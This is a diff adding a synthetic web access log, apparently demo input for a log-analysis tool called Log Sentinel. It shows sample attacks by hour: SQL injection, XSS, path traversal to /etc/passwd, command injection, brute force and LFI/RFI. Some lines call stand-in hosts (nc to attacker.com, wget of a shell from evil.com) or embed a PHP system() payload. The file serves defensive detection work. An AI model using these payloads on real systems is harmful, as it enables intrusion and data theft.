@@ -1,0 +1,93 @@
+# ============================================================
+# Log Sentinel v2.0 - Demo Completo
+# ============================================================
+# Este ficheiro contém exemplos de TODOS os tipos de ataque
+# detetados pelo Log Sentinel, com horas variadas para
+# demonstrar a timeline.
+# ============================================================
+
+# === 02:00 - Atividade Noturna Suspeita ===
+192.168.1.50 - - [29/Jan/2024:02:15:30 +0000] "GET /admin/login HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
+192.168.1.50 - - [29/Jan/2024:02:16:45 +0000] "POST /admin/login HTTP/1.1" 401 500 "-" "Mozilla/5.0"
+192.168.1.50 - - [29/Jan/2024:02:17:02 +0000] "POST /admin/login HTTP/1.1" 401 500 "-" "Mozilla/5.0"
+
+# === 08:00 - Scanner Detection ===
+10.0.0.100 - - [29/Jan/2024:08:10:15 +0000] "GET /robots.txt HTTP/1.1" 200 150 "-" "Nikto/2.1.5"
+10.0.0.100 - - [29/Jan/2024:08:10:16 +0000] "GET /.git/config HTTP/1.1" 404 0 "-" "Nikto/2.1.5"
+10.0.0.100 - - [29/Jan/2024:08:10:17 +0000] "GET /.env HTTP/1.1" 404 0 "-" "Nikto/2.1.5"
+10.0.0.100 - - [29/Jan/2024:08:10:18 +0000] "GET /wp-admin/ HTTP/1.1" 404 0 "-" "Nikto/2.1.5"
+10.0.0.100 - - [29/Jan/2024:08:10:19 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 0 "-" "Nikto/2.1.5"
+45.33.32.156 - - [29/Jan/2024:08:15:30 +0000] "GET / HTTP/1.1" 200 5000 "-" "Nmap Scripting Engine"
+45.33.32.156 - - [29/Jan/2024:08:15:31 +0000] "GET /server-status HTTP/1.1" 403 0 "-" "Nmap Scripting Engine"
+
+# === 09:00 - SQL Injection Attacks (CRITICAL) ===
+192.168.1.100 - - [29/Jan/2024:09:30:45 +0000] "GET /products?id=1' OR '1'='1 HTTP/1.1" 200 5000 "-" "Mozilla/5.0"
+192.168.1.100 - - [29/Jan/2024:09:30:46 +0000] "GET /users?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 200 3000 "-" "Mozilla/5.0"
+192.168.1.100 - - [29/Jan/2024:09:30:47 +0000] "POST /login HTTP/1.1" 200 500 "-" "Mozilla/5.0" "username=admin'--&password=x"
+192.168.1.100 - - [29/Jan/2024:09:31:00 +0000] "GET /search?q='; DROP TABLE users;-- HTTP/1.1" 500 0 "-" "Mozilla/5.0"
+192.168.1.100 - - [29/Jan/2024:09:31:15 +0000] "GET /api/data?filter=1;SELECT@@version HTTP/1.1" 200 100 "-" "Mozilla/5.0"
+
+# === 09:00 - XSS Attacks (HIGH) ===
+172.16.0.50 - - [29/Jan/2024:09:45:00 +0000] "GET /search?q=<script>alert('XSS')</script> HTTP/1.1" 200 1500 "-" "Mozilla/5.0"
+172.16.0.50 - - [29/Jan/2024:09:45:01 +0000] "POST /comment HTTP/1.1" 200 300 "-" "Mozilla/5.0" "body=<img src=x onerror=alert(1)>"
+172.16.0.50 - - [29/Jan/2024:09:45:02 +0000] "GET /page?url=javascript:document.cookie HTTP/1.1" 200 800 "-" "Mozilla/5.0"
+
+# === 10:00 - Path Traversal (HIGH) ===
+10.10.10.50 - - [29/Jan/2024:10:00:30 +0000] "GET /files?path=../../../etc/passwd HTTP/1.1" 403 0 "-" "Mozilla/5.0"
+10.10.10.50 - - [29/Jan/2024:10:00:31 +0000] "GET /download?file=....//....//etc/shadow HTTP/1.1" 403 0 "-" "Mozilla/5.0"
+10.10.10.50 - - [29/Jan/2024:10:00:32 +0000] "GET /read?doc=%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1" 403 0 "-" "Mozilla/5.0"
+10.10.10.50 - - [29/Jan/2024:10:00:45 +0000] "GET /static/../../../proc/self/environ HTTP/1.1" 403 0 "-" "Mozilla/5.0"
+
+# === 11:00 - Command Injection (CRITICAL) ===
+192.168.5.25 - - [29/Jan/2024:11:15:00 +0000] "GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1" 200 2000 "-" "Mozilla/5.0"
+192.168.5.25 - - [29/Jan/2024:11:15:01 +0000] "POST /execute HTTP/1.1" 200 500 "-" "Mozilla/5.0" "cmd=ls|nc attacker.com 4444"
+192.168.5.25 - - [29/Jan/2024:11:15:02 +0000] "GET /run?command=$(wget http://evil.com/shell.sh) HTTP/1.1" 200 100 "-" "Mozilla/5.0"
+192.168.5.25 - - [29/Jan/2024:11:15:15 +0000] "GET /exec?c=;/bin/bash -i HTTP/1.1" 500 0 "-" "Mozilla/5.0"
+
+# === 12:00 - Tráfego Normal ===
+192.168.1.10 - - [29/Jan/2024:12:00:00 +0000] "GET / HTTP/1.1" 200 5000 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+192.168.1.10 - - [29/Jan/2024:12:00:15 +0000] "GET /about HTTP/1.1" 200 3000 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+192.168.1.11 - - [29/Jan/2024:12:05:00 +0000] "GET /products HTTP/1.1" 200 8000 "-" "Chrome/120.0"
+192.168.1.12 - - [29/Jan/2024:12:10:30 +0000] "POST /contact HTTP/1.1" 200 500 "-" "Firefox/121.0"
+
+# === 13:00 - Brute Force Attack (HIGH) ===
+203.0.113.50 - - [29/Jan/2024:13:00:01 +0000] "POST /login HTTP/1.1" 401 100 "-" "Mozilla/5.0"
+203.0.113.50 - - [29/Jan/2024:13:00:02 +0000] "POST /login HTTP/1.1" 401 100 "-" "Mozilla/5.0"
+203.0.113.50 - - [29/Jan/2024:13:00:03 +0000] "POST /login HTTP/1.1" 401 100 "-" "Mozilla/5.0"
+203.0.113.50 - - [29/Jan/2024:13:00:04 +0000] "POST /login HTTP/1.1" 401 100 "-" "Mozilla/5.0"
+203.0.113.50 - - [29/Jan/2024:13:00:05 +0000] "POST /login HTTP/1.1" 401 100 "-" "Mozilla/5.0"
+203.0.113.50 - - [29/Jan/2024:13:00:06 +0000] "POST /login HTTP/1.1" 200 500 "-" "Mozilla/5.0"
+
+# === 14:00 - LFI/RFI Attacks (CRITICAL) ===
+198.51.100.75 - - [29/Jan/2024:14:20:00 +0000] "GET /page?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 500 "-" "Mozilla/5.0"
+198.51.100.75 - - [29/Jan/2024:14:20:01 +0000] "GET /include?page=http://evil.com/shell.txt HTTP/1.1" 200 100 "-" "Mozilla/5.0"
+198.51.100.75 - - [29/Jan/2024:14:20:02 +0000] "GET /load?module=data://text/plain,<?php system($_GET['c']); ?> HTTP/1.1" 200 50 "-" "Mozilla/5.0"
+
+# === 15:00 - DDoS Indicators (CRITICAL) ===
+45.33.32.100 - - [29/Jan/2024:15:00:01 +0000] "GET / HTTP/1.1" 200 5000 "-" "Mozilla/5.0"
+45.33.32.100 - - [29/Jan/2024:15:00:01 +0000] "GET / HTTP/1.1" 200 5000 "-" "Mozilla/5.0"
+45.33.32.100 - - [29/Jan/2024:15:00:01 +0000] "GET / HTTP/1.1" 200 5000 "-" "Mozilla/5.0"
+45.33.32.100 - - [29/Jan/2024:15:00:01 +0000] "GET / HTTP/1.1" 200 5000 "-" "Mozilla/5.0"
+45.33.32.100 - - [29/Jan/2024:15:00:02 +0000] "GET / HTTP/1.1" 503 0 "-" "Mozilla/5.0"
+
+# === 16:00 - API Abuse (MEDIUM) ===
+10.20.30.40 - - [29/Jan/2024:16:00:00 +0000] "GET /api/users HTTP/1.1" 200 1000 "-" "python-requests/2.28.0"
+10.20.30.40 - - [29/Jan/2024:16:00:01 +0000] "GET /api/users HTTP/1.1" 200 1000 "-" "python-requests/2.28.0"
+10.20.30.40 - - [29/Jan/2024:16:00:02 +0000] "GET /api/users HTTP/1.1" 200 1000 "-" "python-requests/2.28.0"
+10.20.30.40 - - [29/Jan/2024:16:00:03 +0000] "GET /api/users HTTP/1.1" 429 0 "-" "python-requests/2.28.0"
+
+# === 17:00 - Sensitive Data Exposure (MEDIUM) ===
+192.168.1.200 - - [29/Jan/2024:17:30:00 +0000] "GET /config?api_key=sk_live_abc123xyz HTTP/1.1" 200 500 "-" "Mozilla/5.0"
+192.168.1.200 - - [29/Jan/2024:17:30:15 +0000] "GET /auth?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 HTTP/1.1" 200 300 "-" "Mozilla/5.0"
+192.168.1.200 - - [29/Jan/2024:17:30:30 +0000] "POST /login?password=admin123 HTTP/1.1" 200 100 "-" "Mozilla/5.0"
+
+# === 18:00 - Mais tráfego normal ===
+192.168.1.15 - - [29/Jan/2024:18:00:00 +0000] "GET /dashboard HTTP/1.1" 200 8000 "-" "Chrome/120.0"
+192.168.1.16 - - [29/Jan/2024:18:15:00 +0000] "GET /profile HTTP/1.1" 200 4000 "-" "Firefox/121.0"
+192.168.1.17 - - [29/Jan/2024:18:30:00 +0000] "POST /settings HTTP/1.1" 200 500 "-" "Safari/17.0"
+
+# === 23:00 - Unauthorized Access Attempts (CRITICAL) ===
+85.25.100.50 - - [29/Jan/2024:23:45:00 +0000] "GET /admin HTTP/1.1" 403 0 "-" "curl/7.88.0"
+85.25.100.50 - - [29/Jan/2024:23:45:15 +0000] "GET /admin/config HTTP/1.1" 403 0 "-" "curl/7.88.0"
+85.25.100.50 - - [29/Jan/2024:23:45:30 +0000] "GET /admin/users HTTP/1.1" 403 0 "-" "curl/7.88.0"
+85.25.100.50 - - [29/Jan/2024:23:50:00 +0000] "DELETE /api/users/1 HTTP/1.1" 403 0 "-" "curl/7.88.0"
